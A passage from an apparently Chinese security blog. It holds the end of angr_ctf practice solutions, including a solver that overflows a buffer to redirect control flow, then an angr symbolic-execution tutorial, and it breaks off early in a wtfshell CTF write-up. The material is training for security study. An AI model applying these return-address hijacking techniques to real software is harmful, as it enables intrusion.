class="number">0</span>]</span><br><span class="line">(password1, password2) = found_state.<span class="built_in">globals</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">answer1 = (found_state.solver.<span class="built_in">eval</span>(password1))</span><br><span class="line">answer2 = (found_state.solver.<span class="built_in">eval</span>(password2,cast_to=<span class="built_in">bytes</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(answer1, answer2))</span><br></pre></td></tr></table></figure>
<p><strong>17_angr_arbitrary_jump</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  read_input();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">32</span>]; <span class="comment">// [esp+28h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个题开始玩 pwn 了，要我们覆盖返回地址</p>
<p>因为本程序随时可能报错，所以我们要在创建仿真器时指定 <code>save_unconstrained=True</code>（angr 不抛出不受约束的状态）</p>
<p>我们需要的结果是无约束状态（因为 <code>Good Job</code> 根本不在程序的执行路径里），如果出现了约束状态下的解则求解失败，有待检查的状态才继续循环遍历所有的状态，最终的结果是找到了一个未约束状态</p>
<p>最后给这个状态加一个约束，使其等于 <code>Good Job</code> 的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./17_angr_arbitrary_jump&quot;</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mySimPro</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    format_addr = <span class="number">0x42585350</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, format_addr, param0</span>):</span></span><br><span class="line">        password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span>*<span class="number">64</span>)</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> password.chop(bits=<span class="number">8</span>):</span><br><span class="line">            self.state.add_constraints(char &gt;= <span class="string">&#x27;A&#x27;</span>, char &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">        self.state.memory.store(param0, password, endness=p.arch.memory_endness)</span><br><span class="line">        self.state.<span class="built_in">globals</span>[<span class="string">&#x27;password&#x27;</span>] = (password)</span><br><span class="line"></span><br><span class="line">scanf_symbol = <span class="string">&#x27;__isoc99_scanf&#x27;</span></span><br><span class="line">p.hook_symbol(scanf_symbol, mySimPro())</span><br><span class="line"></span><br><span class="line">sm = p.factory.simgr(</span><br><span class="line">    init_state, </span><br><span class="line">    save_unconstrained=<span class="literal">True</span>,</span><br><span class="line">    stashes=&#123;</span><br><span class="line">    <span class="string">&#x27;active&#x27;</span> : [init_state],</span><br><span class="line">    <span class="string">&#x27;unconstrained&#x27;</span> : [],</span><br><span class="line">    <span class="string">&#x27;found&#x27;</span> : [],</span><br><span class="line">    <span class="string">&#x27;not_needed&#x27;</span> : []</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> unconstrained_state <span class="keyword">in</span> sm.unconstrained:</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">should_move</span>(<span class="params">s</span>):</span></span><br><span class="line">            <span class="keyword">return</span> s <span class="keyword">is</span> unconstrained_state</span><br><span class="line">        sm.move(<span class="string">&#x27;unconstrained&#x27;</span>, <span class="string">&#x27;found&#x27;</span>, filter_func=should_move)</span><br><span class="line">    sm.step()</span><br><span class="line">    <span class="keyword">if</span>(sm.found):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;get it&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">found_state.add_constraints(found_state.regs.eip == <span class="number">0x42585249</span>)</span><br><span class="line">password = found_state.<span class="built_in">globals</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">answer = (found_state.solver.<span class="built_in">eval</span>(password,cast_to=<span class="built_in">bytes</span>))</span><br><span class="line"><span class="built_in">print</span>(answer[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/09/angr%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/09/angr%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">angr的使用与符号执行</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-12-09 18:27:15 / Modified: 18:30:33" itemprop="dateCreated datePublished" datetime="2022-12-09T18:27:15+08:00">2022-12-09</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Angr 介绍</strong></p>
<p>angr 是一个二进制代码分析工具（基于 python），能够自动化完成二进制文件的分析，并找出漏洞</p>
<ul>
<li>它将以前多种分析技术集成进来，­­­能够进行动态的符号执行分析（类似于 KLEE 和 Mayhem），也能够进行多种静态分析</li>
<li>PS：使用符号执行分析一个程序时，该程序会使用符号值作为输入（并非使用具体值），在达到目标代码时，分析器可以得到相应的路径约束，然后通过约束求解器来得到可以触发目标代码的具体值</li>
</ul>
<p><strong>传统符号执行</strong></p>
<p>传统符号执行是一种静态分析技术</p>
<ul>
<li>通过使用抽象的符号（静态或者全局变量的名称）代替具体值来模拟程序的执行</li>
<li>当遇到分支语句时，它会探索每一个分支，将分支条件加入到相应的路径约束中</li>
<li>若约束可解，则说明该路径是可达的</li>
</ul>
<p>接下来就通过以下的伪代码案例来推演这个过程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">twice</span><span class="params">(<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testme</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    z = twice(y);</span><br><span class="line">    <span class="keyword">if</span>(z == x)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&gt;y+<span class="number">10</span>)&#123;</span><br><span class="line">            ERROR;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    x = sym_input();</span><br><span class="line">    y = sym_input();</span><br><span class="line">    testme(x,y);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>程序不会直接输入具体值，而是输入一个符号值</li>
<li>接着尽可能探索每一个分支，把程序的所有执行路径表示成一棵执行树</li>
</ul>
<img src="/2022/12/09/angr%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/1670505794268.png" class width="1670505794268"> 
<p>符号执行维护了：</p>
<ul>
<li>符号状态 σ (symbolic state)：变量到符号表达式的映射 </li>
<li>符号路径约束 PC (path constraint)：表示当前路径的约束条件</li>
</ul>
<p>在对程序的某一路径分支进行符号执行的终点，把 PC 输入约束求解器 (constraint solver) 以获得求解，生成实际的输入值</p>
<ul>
<li>PS：如果程序把生成的具体值作为输入执行，它将会和符号执行运行在同一路径，即此时 PC 的公式所表示的路径，并且以同一种方式结束</li>
</ul>
<p>经典的符号执行有一个关键的缺点，若符合执行路径的符号路径约束无法使用约束求解器进行有效的求解，则无法生成输入</p>
<p><strong>动态符号执行</strong></p>
<p>混合“实际执行”和“符号执行” (concolic execution)，是真正意义上的动态符号执行 </p>
<ul>
<li>经典的符号执行，过度的依赖了符号执行的约束求解能力，限制了传统符号执行的能力发挥</li>
<li>如果能加入具体值进行分析，将大大简化分析过程，降低分析的难度和提升效率</li>
<li>但分析过程中，仍不可避免的还是需要将各种条件表达式，进行符号化抽象后变成约束条件参与执行</li>
</ul>
<p>将程序语句转换为符号约束的精度，对符号执行所达到的覆盖率以及约束求解的可伸缩性会产生重大影响，所以如何做好 “混合具体(Concrete)执行” 和 “符号(Symbolic)执行” 的能力的平衡，就成为现代符号执行的关键点</p>
<p><strong>选择性符号执行</strong></p>
<p>受路径爆炸和约束求解问题的制约，符号执行不适用于程序规模较大或逻辑复杂的情况，并且对于与外部执行环境交互较多的程序尚无很好的解决方法</p>
<p>选择性符号执行有助于解决这类问题，也是具体执行和符号执行混合的一种分析技术，依据特定的分析，决定符号执行和具体执行的切换使用</p>
<ul>
<li>用户可以指定一个完整系统中的任意部分进行符号执行分析（可以是应用程序、库文件、系统内核和设备驱动程序等）</li>
<li>选择性符号执行在符号执行和具体执行间转换，并透明地转换符号状态和具体状态</li>
<li>选择性符号执行极大地提高了符号执行在实际应用中对大型软件分析测试的可用性，且不再需要对这些环境进行模拟建模</li>
</ul>
<p>选择性符号执行在指定区域内的符号化搜索，就是完全的符号执行，在该区域之外均使用具体执行完成，选择性符号执行的主要任务就是在分析前将大程序区分为 “具体执行区域” 和 “符号执行区域”</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lqerio/p/15980670.html">符号执行（symbolic executio）技术综述</a> </p>
<p><strong>Angr 安装</strong></p>
<p>为了不与 pwntools 库引起冲突，可以采用拉取 docker 镜像的方式进行使用（当然也可以直接 <code>pip install angr</code> 也可以）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull angr/angr</span><br></pre></td></tr></table></figure>
<p>以下脚本可以方便我们运行 docker angr：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/zsh</span></span><br><span class="line">pwd=`pwd`</span><br><span class="line">script=$1</span><br><span class="line">docker run -it -u angr --rm -v $pwd:/mnt -w /mnt angr/angr &quot;/home/angr/.virtualenvs/angr/bin/python&quot; &quot;/mnt/$script&quot; $2 $3</span><br></pre></td></tr></table></figure>
<p>使用该脚本：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./angr script.py</span><br></pre></td></tr></table></figure>
<p><strong>Angr 使用</strong></p>
<p>Github 上有一个针对 angr 的练习集：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/jakespringer/angr_ctf">jakespringer/angr_ctf (github.com)</a> </li>
</ul>
<p>这里先通过 <code>00_angr_find</code> 来了解 angr 的基础用法</p>
<p>IDA 分析出来的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">9</span>]; <span class="comment">// [esp+23h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    s1[i] = complex_function(s1[i], i);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;JACEJGCS&quot;</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其中的 <code>complex_function</code> 是一个加密的过程</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">complex_function</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">64</span> || a1 &gt; <span class="number">90</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">3</span> * a2 + a1 - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果采用常规的解题思维，那就要对 <code>complex_function</code> 进行逆向，分析出输入值，但 angr 采用了不同的做法</p>
<p>先新建一个 angr 工程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = angr.Project(<span class="string">&quot;./00_angr_find&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>告诉 angr 一个初始化状态：（Unicorn 框架允许执行任意一段二进制代码）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init_state = p.factory.entry_state() <span class="comment"># 程序入口点</span></span><br></pre></td></tr></table></figure>
<p>生成一个 SimulationManagers 对象，用于管理“模拟执行”：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sm = p.factory.simulation_manager(init_state)</span><br></pre></td></tr></table></figure>
<p>告诉 SimulationManagers 对象需要查找的路径地址，并开始“模拟执行”：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sm.explore(find=<span class="number">0x08048678</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>angr 会把输入值 <code>s1</code> 转化为一个符号向量（用于决定“模拟执行”的路径）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s1);</span><br></pre></td></tr></table></figure>
<ul>
<li>然后遍历所有的程序路径，找到进入各个路径的约束条件：</li>
</ul>
<img src="/2022/12/09/angr%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/1670578268195.png" class width="1670578268195"> 
<ul>
<li>最后把目标路径的约束输入约束求解器 (constraint solver) 以获得求解，生成实际的输入值</li>
</ul>
<p>最终的结果存放在 <code>found</code> 中，我们可以打印出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(found_state.posix.dumps(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(found_state.posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b<span class="number">&#x27;</span>Enter the password: &#x27;</span><br><span class="line">b<span class="number">&#x27;</span>JXWVXRKX<span class="number">&#x27;</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/08/Strtok%20off-by-null+%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/08/Strtok%20off-by-null+%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">Strtok off-by-null+侧信道攻击</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-12-08 05:21:15 / Modified: 05:23:53" itemprop="dateCreated datePublished" datetime="2022-12-08T05:21:15+08:00">2022-12-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>wtfshell1 复现</strong></p>
<p><strong>注意</strong>：<strong>此挑战是开源的，不要浪费时间对二进制文件进行逆向工程</strong></p>
<p>这个挑战有两个 flag：</p>
<ul>
<li>1.第一个 flag 隐藏在虚拟文件系统（又名内存）内的“flag1”文件中，甚至无法被虚拟根目录读取，您的目标是 pwn 库并实现 RAA</li>
<li>2.第二个 flag 位于虚拟文件系统之外，这意味着您必须实现任意代码执行（实际上是 ORW，由于seccomp）才能获得 flag </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.36</span><span class="number">-0u</span>buntu3)</span> stable release version 2.36.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wtfshell: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">14b</span>74f98df26b1325153b74f6d77440e0b761024, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">[!] Could <span class="keyword">not</span> populate PLT: invalid syntax (unicorn.py, line <span class="number">110</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/wtfshell/share/wtfshell&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">➜  share seccomp-tools dump ./wtfshell  </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != read) <span class="keyword">goto</span> <span class="number">0006</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A != close) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A != mmap) <span class="keyword">goto</span> <span class="number">0017</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000020</span>  A = prot <span class="meta"># mmap(addr, len, prot, flags, fd, pgoff)</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000007</span>  <span class="keyword">if</span> (A == <span class="number">0x7</span>) <span 